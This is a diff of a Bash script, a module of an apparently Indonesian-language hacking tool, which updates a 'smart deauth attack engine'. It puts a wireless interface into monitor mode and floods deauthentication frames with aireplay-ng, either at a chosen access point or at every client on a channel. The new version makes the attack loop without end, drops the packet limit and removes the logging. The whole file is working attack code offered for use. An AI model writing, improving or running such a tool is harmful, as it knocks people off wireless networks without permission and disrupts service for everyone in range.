@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
 # ============================================
-#   MODULE: CHOKE THE HUNTERS (v6.1 Fix Target)
+#   MODULE: CHOKE THE HUNTERS (v8.0 Final)
 # ============================================
 
 if [ -f "./bxp_libcore.sh" ]; then source ./bxp_libcore.sh; fi
 
 show_ascii() {
     clear
-    echo -e "\033[38;2;255;215;0m" # EMAS
+    echo -e "\033[38;2;255;215;0m"
     cat <<'ASCII'
 ██████╗██╗  ██╗ ██████╗ ██╗  ██╗███████╗    ████████╗██╗  ██╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ███████╗
 ██╔════╝██║  ██║██╔═══██╗██║ ██╔╝██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝
@@ -22,11 +22,7 @@ ASCII
 detect_env() {
     IS_TERMUX=0
     if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "com.termux"; then IS_TERMUX=1; fi
-    if [ "$(id -u)" -eq 0 ]; then
-        ROOT_MODE=1; STATUS_MSG="\033[1;32m[+] ROOT MODE ACTIVE\033[0m"
-    else
-        ROOT_MODE=0; STATUS_MSG="\033[1;33m[!] NON-ROOT MODE (LIMITED)\033[0m"
-    fi
+    if [ "$(id -u)" -eq 0 ]; then ROOT_MODE=1; STATUS_MSG="\033[1;32m[+] ROOT MODE ACTIVE\033[0m"; else ROOT_MODE=0; STATUS_MSG="\033[1;33m[!] NON-ROOT MODE\033[0m"; fi
 }
 
 pilih_interface() {
@@ -37,68 +33,52 @@ pilih_interface() {
         local SUPPORT=$(iw phy $(iw dev ${IFACES[$i]} info 2>/dev/null | grep wiphy | awk '{print $2}') info 2>/dev/null | grep -q "monitor" && echo "[Support Monitor]" || echo "[No Monitor]")
         echo -e "  \033[1;32m[$((i+1))]\033[0m ${IFACES[$i]} \033[1;33m$SUPPORT\033[0m"
     done
-    echo ""
-    read -p "Pilih nomor interface (default 1): " IFACE_CHOICE
-    IFACE_CHOICE=${IFACE_CHOICE:-1}
-    IFACE=${IFACES[$((IFACE_CHOICE-1))]}
-    if [ -z "$IFACE" ]; then echo -e "\033[0;31m[!] Pilihan tidak valid.\033[0m"; return 1; fi
-    return 0
+    read -p "Pilih nomor interface (default 1): " IFACE_CHOICE; IFACE_CHOICE=${IFACE_CHOICE:-1}; IFACE=${IFACES[$((IFACE_CHOICE-1))]}; return 0
 }
 
 setup_monitor() {
-    echo -e "\033[0;33m[*] Mematikan NetworkManager & menyiapkan Monitor Mode...\033[0m"
-    systemctl stop NetworkManager 2>/dev/null
-    nmcli radio wifi off 2>/dev/null
-    airmon-ng check kill >/dev/null 2>&1
-    airmon-ng start "$IFACE" >/dev/null 2>&1
-    
-    # Paksa pake interface mon yang baru
-    MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1)
-    if [ -z "$MON_IFACE" ]; then MON_IFACE="${IFACE}mon"; fi # Fallback kalo misal namanya wlan0mon
-    if ! iw dev "$MON_IFACE" info >/dev/null 2>&1; then MON_IFACE="$IFACE"; fi # Kalo tetep gagal, balik ke awal
-    
-    echo -e "\033[0;32m[+] Monitor Mode Aktif di: $MON_IFACE\033[0m"
+    systemctl stop NetworkManager 2>/dev/null; nmcli radio wifi off 2>/dev/null; airmon-ng check kill >/dev/null 2>&1; airmon-ng start "$IFACE" >/dev/null 2>&1
+    MON_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "mon" | head -n 1); if [ -z "$MON_IFACE" ]; then MON_IFACE="$IFACE"; fi
 }
 
 cleanup() {
-    echo -e "\n\033[0;33m[*] Memaksa proses berhenti & mengembalikan mode normal...\033[0m"
-    pkill -9 -f "aireplay-ng" 2>/dev/null
+    pkill -9 -f "aireplay-ng" 2>/dev/null; pkill -9 -f "deauth_loop" 2>/dev/null
     if [ -n "$MON_IFACE" ]; then airmon-ng stop "$MON_IFACE" >/dev/null 2>&1; fi
     if [ -n "$IFACE" ]; then airmon-ng stop "$IFACE" >/dev/null 2>&1; fi
-    systemctl restart NetworkManager 2>/dev/null
-    nmcli radio wifi on 2>/dev/null
-    svc wifi enable 2>/dev/null
-    sleep 1
+    systemctl restart NetworkManager 2>/dev/null; nmcli radio wifi on 2>/dev/null; svc wifi enable 2>/dev/null
 }
-
 trap cleanup SIGINT SIGTERM
 
-while true; do
-    show_ascii
-    detect_env
+loop_deauth() {
+    while true; do aireplay-ng --deauth 10 -a "$1" "$2" > /dev/null 2>&1; sleep 0.5; done
+}
 
+while true; do
+    show_ascii; detect_env
     echo -e "${C}======================================================${N}"
     echo -e "${W}    SMART DEAUTH ATTACK ENGINE${N}"
     echo -e "    Status: $STATUS_MSG"
     echo -e "${C}======================================================${N}"
     echo ""
-    if [ "$ROOT_MODE" -eq 1 ]; then
+    if [ "$ROOT_MODE" -eq 1 ] && [ "$IS_TERMUX" -eq 0 ]; then
         echo -e "  \033[1;32m[1]\033[0m  \033[1;37mTargeted Deauth (1 BSSID)\033[0m"
         echo -e "  \033[1;32m[2]\033[0m  \033[1;37mMass Deauth (Semua Client)\033[0m"
     else
-        echo -e "  \033[1;30m[1] Targeted Deauth (Requires Root)\033[0m"
-        echo -e "  \033[1;30m[2] Mass Deauth (Requires Root)\033[0m"
+        echo -e "  \033[1;30m[1] Targeted Deauth (Requires PC & Root)\033[0m"
+        echo -e "  \033[1;30m[2] Mass Deauth (Requires PC & Root)\033[0m"
     fi
-    echo ""
-    echo -e "  \033[1;31m[0]\033[0m  \033[1;37mBack to Main Menu\033[0m"
-    echo ""
-    echo -e "${C}------------------------------------------------------${N}"
-    echo -ne "  ${Y}Select option > ${N}"
+    echo ""; echo -e "  \033[1;31m[0]\033[0m  \033[1;37mBack to Main Menu\033[0m"; echo ""
+    echo -e "${C}------------------------------------------------------${N}"; echo -ne "  ${Y}Select option > ${N}"
     read -r choke_choice
 
     if [ "$choke_choice" = "1" ] || [ "$choke_choice" = "2" ]; then
+        if [ "$IS_TERMUX" -eq 1 ]; then
+            echo -e "\n\033[0;31m[!] DITOLAK: Termux (HP) tidak support Deauth tanpa USB Adapter.\033[0m"
+            echo -e "\033[0;33m    Silakan jalankan Night World di PC (Kali/BlackArch).\033[0m"
+            read -p "Press Enter..."; continue
+        fi
         if [ "$ROOT_MODE" -eq 0 ]; then
-            echo -e "\n\033[0;31m[!] FITUR INI MEMBUTUHKAN ROOT (SU/MAGISK).\033[0m"
+            echo -e "\n\033[0;31m[!] DITOLAK: PC Non-Root. Jalankan pake sudo!\033[0m"
             read -p "Press Enter..."; continue
         fi
     fi
@@ -106,59 +86,31 @@ while true; do
     case "$choke_choice" in
         1)
             pilih_interface || { read -p "Press Enter..."; continue; }
-            read -p "Masukkan BSSID Target (contoh: AA:BB:CC:DD:EE:FF): " BSSID
-            read -p "Masukkan Channel Target (contoh: 6): " CHAN
-            read -p "Jumlah packet Deauth (default 50): " DEAUTH_COUNT
-            DEAUTH_COUNT=${DEAUTH_COUNT:-50}
+            while true; do
+                read -p "Masukkan BSSID Target: " BSSID
+                if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then break; else echo -e "\033[0;33m[*] Format BSSID salah (harus 6 blok).\033[0m"; fi
+            done
+            read -p "Masukkan Channel Target: " CHAN
+            setup_monitor; iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
-            setup_monitor
-            iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
-            
-            echo -e "\n${R}[*] Meluncurkan Deauth ke $BSSID...${N}"
-            # Jalanin di background, simpen log
-            aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MON_IFACE" > /tmp/deauth_log.txt 2>&1 &
-            DEAUTH_PID=$!
-            
-            echo -e "\033[1;33m[*] Deauth berjalan di background.\033[0m"
-            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
-            read -r
-            
-            echo -e "\n${Y}[*] Menghentikan Deauth...${N}"
-            kill -9 $DEAUTH_PID 2>/dev/null
-            wait $DEAUTH_PID 2>/dev/null
-            
-            echo -e "\n${G}[+] Log Deauth Terakhir:${N}"
-            cat /tmp/deauth_log.txt
-            
-            cleanup
-            read -p "Press Enter to continue..."
+            echo -e "\n${R}[*] INFINITE DEAUTH KE $BSSID...${N}"
+            loop_deauth "$BSSID" "$MON_IFACE" &
+            LOOP_PID=$!
+            echo -e "\n\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"; read -r
+            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
+            cleanup; read -p "Press Enter to continue..."
             ;;
         2)
             pilih_interface || { read -p "Press Enter..."; continue; }
-            read -p "Masukkan Channel Target (contoh: 6): " CHAN
-            read -p "Jumlah packet Deauth (default 10): " DEAUTH_COUNT
-            DEAUTH_COUNT=${DEAUTH_COUNT:-10}
+            read -p "Masukkan Channel Target: " CHAN
+            setup_monitor; iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
             
-            setup_monitor
-            iw dev "$MON_IFACE" set channel "$CHAN" >/dev/null 2>&1
-            
-            echo -e "\n${R}[*] Meluncurkan Mass Deauth di Channel $CHAN...${N}"
-            aireplay-ng --deauth "$DEAUTH_COUNT" -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /tmp/deauth_log.txt 2>&1 &
-            DEAUTH_PID=$!
-            
-            echo -e "\033[1;33m[*] Mass Deauth berjalan di background.\033[0m"
-            echo -e "\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"
-            read -r
-            
-            echo -e "\n${Y}[*] Menghentikan Mass Deauth...${N}"
-            kill -9 $DEAUTH_PID 2>/dev/null
-            wait $DEAUTH_PID 2>/dev/null
-            
-            echo -e "\n${G}[+] Log Deauth Terakhir:${N}"
-            cat /tmp/deauth_log.txt
-            
-            cleanup
-            read -p "Press Enter to continue..."
+            echo -e "\n${R}[*] INFINITE MASS DEAUTH DI CHANNEL $CHAN...${N}"
+            while true; do aireplay-ng --deauth 10 -a "FF:FF:FF:FF:FF:FF" "$MON_IFACE" > /dev/null 2>&1; sleep 0.5; done &
+            LOOP_PID=$!
+            echo -e "\n\033[1;33m[*] Tekan [ENTER] untuk STOP...\033[0m"; read -r
+            kill -9 $LOOP_PID 2>/dev/null; pkill -9 -f "aireplay-ng" 2>/dev/null
+            cleanup; read -p "Press Enter to continue..."
             ;;
         0) exit 0 ;;
         *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
